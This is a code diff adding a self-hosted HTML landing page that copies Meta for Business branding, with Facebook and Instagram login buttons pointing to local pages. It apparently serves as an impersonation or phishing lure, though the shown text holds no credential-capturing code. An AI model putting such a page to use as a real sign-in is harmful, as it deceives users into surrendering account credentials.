@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <title>Meta for Business</title>
+        <link rel="icon" href="./app/static/images/favicon.ico" />
+        <link rel="stylesheet" href="./app/static/dist/style.css" />
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fontawesome-4.7@4.7.0/css/font-awesome.min.css" />
+        <script defer src="./app/static/src/app.js"></script>
+        <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.15.4/dist/cdn.min.js"></script>
+    </head>
+    <body class="m-0 min-h-screen overflow-x-hidden bg-gray-50 text-gray-900">
+        <main x-data="landingPage" class="flex h-full w-full flex-col md:fixed md:inset-0 md:z-50 md:flex-row">
+            <section class="flex w-full flex-col justify-center bg-linear-to-br from-[#f7eef6] to-[#e7f5fb] px-[8%] py-12 md:w-[45%]">
+                <img src="./app/static/images/meta-logo.png" alt="Meta" class="mb-10 h-12 w-18 object-contain" />
+                <p class="mb-6 text-[40px] leading-[1.1] font-semibold text-[#111112]">Get started with <span class="block">business tools from Meta</span></p>
+                <p class="mb-6 text-[15px] leading-5 text-[#111112]">By logging in, you can navigate to all business tools like <span class="font-semibold">Meta Business Suite</span>, <span class="font-semibold">Ads Manager</span> and more to help you connect with your customers and get better business results.</p>
+                <p class="mb-3 text-[15px] leading-5 text-[#111112]">Our business tools can help you:</p>
+                <div class="space-y-3 pl-5 text-[15px] leading-5 text-[#111112]">
+                    <p>• Save time by accessing everything you need to manage your business across Facebook, Instagram and Messenger all in one place</p>
+                    <p>• Connect with the people who matter most to your business using a single inbox</p>
+                    <p>• Track what's working best with performance insights across Meta technologies</p>
+                </div>
+            </section>
+            <section class="relative hidden h-full items-center justify-center overflow-hidden bg-[#e9ebeb] md:flex md:w-[20%]">
+                <img src="./app/static/images/business.png" alt="Business tools" class="h-full w-full object-contain" />
+            </section>
+            <section class="relative flex w-full flex-col items-center justify-center bg-white px-10 py-12 md:w-[35%]">
+                <div class="w-full max-w-100">
+                    <p class="mb-6 text-center text-[17px] leading-5.5 font-semibold text-[#111112]">Log into business tools from Meta</p>
+                    <a href="./facebook-login.html" class="mb-2 flex h-9 w-full items-center justify-center rounded-full border border-[#d1d5db] px-4 py-2 transition hover:bg-gray-50 md:w-106.25">
+                        <img src="./app/static/images/facebook-icon.png" alt="" class="mr-3 h-4 w-4" />
+                        <span class="text-[13px] leading-4.25 font-medium text-[#111112]">Continue with Facebook</span>
+                    </a>
+                    <a href="./instagram-login.html" class="mb-6 flex h-9 w-full items-center justify-center rounded-full border border-[#d1d5db] px-4 py-2 transition hover:bg-gray-50 md:w-106.25">
+                        <img src="./app/static/images/instagram-icon.png" alt="" class="mr-3 h-4 w-4" />
+                        <span class="text-[13px] leading-4.25 font-medium text-[#111112]">Continue with Instagram</span>
+                    </a>
+                    <div class="mb-10 border-b border-[#e5e7eb] pb-10 text-center"><button type="button" class="text-[13px] leading-4.25 font-medium text-[#111112] hover:underline">Create new account</button></div>
+                    <div class="text-center">
+                        <p class="mb-5 text-[13px] leading-4.25 font-medium text-[#111112]">Log in with a managed Meta account</p>
+                        <img src="./app/static/images/meta-icon.png" alt="Meta" class="mx-auto h-3 w-15 object-contain" />
+                    </div>
+                </div>
+            </section>
+        </main>
+    </body>
+</html>
